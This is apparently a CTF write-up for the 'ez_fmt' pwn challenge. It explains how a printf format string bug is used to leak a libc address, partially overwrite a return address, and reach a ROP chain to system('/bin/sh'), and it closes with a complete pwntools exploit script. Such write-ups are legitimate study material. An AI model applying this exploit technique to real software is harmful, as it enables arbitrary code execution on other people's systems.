# ez_fmt   libc-2.31.so
## Check
No address randomization
![在这里插入图片描述](/images/csdn/2023/csdn-135139109/image-001-d584191785.png)
## main
![在这里插入图片描述](/images/csdn/2023/csdn-135139109/image-002-229219215f.png)
A simple and crude printf format string vulnerability

## Approach
Leak an address, overwrite a return address to form a ROP chain
When printf executes, the stack contains the address of the instruction at __libc_start_main+243, which can be leaked to obtain the libc base address
Regarding overwriting return addresses, we can modify main's return address or printf's return address
If we modify main's return address, the allowed length of the input format string may not be enough
What about modifying printf's return address: compute the libc base address and the address of system, then trigger the original read and printf format string vulnerability again, this time modifying printf's return address to the address of system. But we find that the number of characters required to modify to system's address may not be enough
![在这里插入图片描述](/images/csdn/2023/csdn-135139109/image-003-42390744d4.png)
This is equivalent to changing 0x4012ce to 0x7f7569415000, and the address parameter alone would burst the allowed input length, so changing printf's return address to a brand-new one definitely will not work, but modifying only part of it is useless
So.....
Better to modify read's return address. Since the location of the buf that read writes into does not change, but the return address to be pushed before the call is always at the current stack top -8, if buf is located above the stack top from before the current call, read's return address can be modified; and because this is an input-based operation, read's return address can be modified extensively





Right below the main function is libc_init_csu; we can use pop instructions to lower the position of the stack top, so that read's return address falls within the range of buf
Since writing and outputting the parameter of libc_start_main in the format string already takes 16 bytes, the remaining part still has to hold the address to return to read and the return address controlling the pop
And to make read's return address fall within the range of buf: on one hand, the stack top after the pop must still be within the range of buf; on the other hand, after the pop, ret must be able to successfully jump back to the read function, so at least two pops are needed — just pick them from libc_ini_csu
Jump to the pop first and then back to read; the other way around, read's return address would not be within the range of buf
![在这里插入图片描述](/images/csdn/2023/csdn-135139109/image-004-6a206fd0db.png)
The read instruction
![在这里插入图片描述](/images/csdn/2023/csdn-135139109/image-005-647f0a3c6e.png)
Read's address is after the pop, at the corresponding position on the stack, and changing printf's return address to the address of pop only requires modifying the low bytes
Leaking the location of libc_start_main+243, which corresponds to the 19th parameter, lets us compute the libc base address after printf
![在这里插入图片描述](/images/csdn/2023/csdn-135139109/image-006-64b1667207.png)
The read input then just constructs a ROP chain toward the return address
Use ROPgadget to find a suitable pop rdi; ret, then use libc.search(b"/bin/sh") to find the address of the argument, and finally call system
![](/images/csdn/2023/csdn-135139109/image-007-c4d6301538.png)

## exp

```python
from pwn import *
libc=ELF("./libc-2.31.so")
f=process("./ez_fmt")
context(os="linux",arch="amd64",log_level="debug")
gdb.attach(f,"b main")
f.recvuntil(b"There is a gift for you ")
stack_buf=int(f.recvuntil(b"\n",drop=True),16)
print(p64(stack_buf-8))
payload=flat(
    {
        0:"%{}c%9$hhn%19$p".format(0xd0) ,
        0x10: p64(0x0000000000401205)+p64(stack_buf-8)
    }
)
f.sendline(payload)
f.recvuntil(b"0x")
libc_start_main_243=int(f.recv(12),16)
libc_base=libc_start_main_243-243-libc.sym["__libc_start_main"]

print(hex(libc_base))
print(hex(libc.search(b"/bin/sh").__next__()))
pop_rdi_ret=p64(0x00000000004012d3)
print(len(payload))
payload=flat(
    {
        0x10:pop_rdi_ret+p64(libc_base+libc.search(b"/bin/sh\x00").__next__()),#注意search（）是括号
        0x20:p64(libc_base+libc.sym["system"])
    }
) # 0x10前面的部分会自动随机填充
print(len(payload))
print(payload)
f.sendline(payload)

f.interactive()

```
